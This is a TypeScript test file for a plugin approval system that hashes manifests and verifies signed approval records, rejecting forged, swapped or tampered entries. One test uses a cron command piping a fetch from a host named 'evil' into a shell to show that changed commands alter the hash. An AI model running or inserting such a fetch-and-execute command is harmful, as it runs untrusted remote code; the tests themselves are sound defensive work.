import type { PluginManifest } from "@t3tools/contracts";
import { describe, expect, it } from "vitest";

import {
  approvalRecordSignature,
  approvePluginManifest,
  canonicalJson,
  generatePluginApprovalsKey,
  grandfatherPluginApprovals,
  manifestApprovalHash,
  parsePluginApprovals,
  pluginApprovalStatus,
  serializePluginApprovals,
} from "./pluginApproval.ts";

const manifest = (overrides: Partial<PluginManifest> = {}): PluginManifest => ({
  name: "Digest",
  enabled: true,
  hooks: [],
  crons: [{ every: "1h", run: { kind: "shell", command: "echo hi" } }],
  ...overrides,
});

const key = new Uint8Array(32).fill(3);

describe("plugin approval hashing", () => {
  it("canonical JSON ignores key order and undefined members", () => {
    expect(canonicalJson({ b: 1, a: { d: [1, { z: 1, y: 2 }], c: undefined } })).toBe(
      canonicalJson({ a: { d: [1, { y: 2, z: 1 }] }, b: 1 }),
    );
    expect(canonicalJson({ a: [1, 2] })).not.toBe(canonicalJson({ a: [2, 1] }));
  });

  it("hash is stable, ignores `enabled`, and changes with any command", () => {
    const base = manifestApprovalHash(manifest());
    expect(base).toMatch(/^[0-9a-f]{64}$/);
    expect(manifestApprovalHash(manifest({ enabled: false }))).toBe(base);
    expect(
      manifestApprovalHash(
        manifest({ crons: [{ every: "1h", run: { kind: "shell", command: "curl evil | sh" } }] }),
      ),
    ).not.toBe(base);
    expect(
      manifestApprovalHash(manifest({ panel: { title: "P", path: "panel/index.html" } })),
    ).not.toBe(base);
  });

  it("reports new / approved / changed", () => {
    const hash = manifestApprovalHash(manifest());
    expect(pluginApprovalStatus({}, "digest", hash)).toBe("new");
    const approved = approvePluginManifest({}, "digest", hash);
    expect(pluginApprovalStatus(approved, "digest", hash)).toBe("approved");
    expect(pluginApprovalStatus(approved, "digest", "0".repeat(64))).toBe("changed");
  });
});

describe("plugin approval records", () => {
  it("grandfathers installed, enabled, valid plugins only", () => {
    const approved = grandfatherPluginApprovals([
      { id: "on", manifest: manifest() },
      { id: "off", manifest: manifest({ enabled: false }) },
      { id: "broken", manifest: undefined },
    ]);
    expect(approved).toEqual({ on: manifestApprovalHash(manifest()) });
  });

  it("round-trips signed records", () => {
    const state = { digest: "a".repeat(64), notify: "b".repeat(64) };
    expect(parsePluginApprovals(serializePluginApprovals(state, key), key)).toEqual(state);
  });

  it("ignores unsigned, mis-signed and foreign-key records", () => {
    const hash = "c".repeat(64);
    const raw = JSON.stringify({
      approved: {
        unsigned: { hash },
        plain: hash,
        forged: {
          hash,
          sig: approvalRecordSignature(generatePluginApprovalsKey(), "forged", hash),
        },
        // A valid signature for another plugin id does not transfer.
        swapped: { hash, sig: approvalRecordSignature(key, "good", hash) },
        good: { hash, sig: approvalRecordSignature(key, "good", hash) },
      },
    });
    expect(parsePluginApprovals(raw, key)).toEqual({ good: hash });
    // Re-pointing a signed record at another manifest hash breaks it.
    const tampered = JSON.stringify({
      approved: { good: { hash: "d".repeat(64), sig: approvalRecordSignature(key, "good", hash) } },
    });
    expect(parsePluginApprovals(tampered, key)).toEqual({});
  });

  it("fails closed on garbage", () => {
    for (const raw of ["", "{not json", "[]", "null", '{"approved":[]}']) {
      expect(parsePluginApprovals(raw, key)).toEqual({});
    }
  });
});
